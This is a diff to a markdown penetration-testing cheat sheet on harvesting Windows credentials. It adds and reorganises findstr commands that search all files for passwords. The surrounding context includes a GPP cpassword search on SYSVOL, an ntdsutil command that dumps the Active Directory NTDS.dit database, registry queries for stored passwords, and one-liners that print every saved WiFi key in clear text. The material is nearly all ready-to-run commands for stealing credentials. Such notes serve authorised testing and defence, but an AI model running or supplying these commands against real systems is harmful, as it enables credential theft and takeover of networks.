@@ -28,6 +28,15 @@ Search for stored password in Group Policy files stored on SYSVOL.
 ```
 findstr /S /I cpassword \\sysvol\policies\*.xml
 ```
+Find all passwords in all files.
+```
+findstr /spin "password" *.*
+findstr /si password *.xml *.ini *.txt
+findstr /si password *.txt *.ini *.config *.xml
+findstr /si password *.txt | *.xml | *.ini | *.rdp | *.py | *.pl | *.log
+```
+Consider trying other variations of password like pass, cred, credentials, etc. 
+
 ## rpcping
 https://lolbas-project.github.io/lolbas/Binaries/Rpcping/#credentials
 
@@ -57,12 +66,6 @@ Dumping of Active Directory NTDS.dit database into folder
 ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
 ```
 
-# clear text Passwords
-```
-findstr /si password *.txt *.ini *.config *.xml
-```
-Look through output. most will help files, but you might get lucky and find an actual password file. 
-
 # search for unattended.xml files
 ```
 Get-Childitem –Path C:\ -Include unattended.xml -Recurse -ErrorAction SilentlyContinue
@@ -82,15 +85,8 @@ dir /s *pass*
 dir /s *cred*
 dir /s *vnc*
 dir /s *.config
-findstr /si password *.xml *.ini *.txt
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
-```
-
-## Find all passwords in all files.
-```
-findstr /spin "password" *.*
-findstr /si password *.txt | *.xml | *.ini | *.rdp | *.py | *.pl
 ```
 
 ## Other Searches
@@ -152,7 +148,6 @@ To further investigate:
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 
-
 ## Powershell:
 search for specific files:
 ```
@@ -176,13 +171,11 @@ ls -r *.txt | Select-String -Pattern "password" | Select Path, LineNumber | Form
 ls -r *.txt | Select-String -Pattern "password" -ErrorAction SilentlyContinue
 ```
 
-
 # Powershell Wifi Passwords 
 ## Grab all wifi passwords and format the output to be easy to read:
 ```
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize
 ```
-
 
 # CMD WiFi Passwords
 ## Grab all wifi passwords and format the output to be easy to read:
@@ -191,7 +184,6 @@ cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| fi
 ```
 
 ### netsh wlan show profile
-
 ```
 C:\>netsh wlan show profile
 
@@ -252,7 +244,6 @@ Cost settings
     Roaming                : No
     Cost Source            : Default
 ```
-
 
 ## search for python:
 ```
